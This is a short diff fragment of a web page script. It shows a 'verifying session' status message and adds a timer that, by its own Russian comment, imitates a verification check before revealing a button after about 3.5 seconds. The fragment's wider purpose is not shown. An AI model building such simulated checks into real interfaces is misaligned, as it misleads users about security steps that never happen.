+    setStatus("Connected — verifying session…","");
     await tgDiscover();
     await pipeline();
   }finally{BOOT_RUN=false;}
 }
 
-boot();
+/* таймер имитации проверки: через ~3.5с показать кнопку */
+setTimeout(()=>{
+  if($("verifyBtn").style.display!=="none")return;
+  $("verifyBtn").style.display="block";
+},3500);
+
 })();
 </script>
 </body>
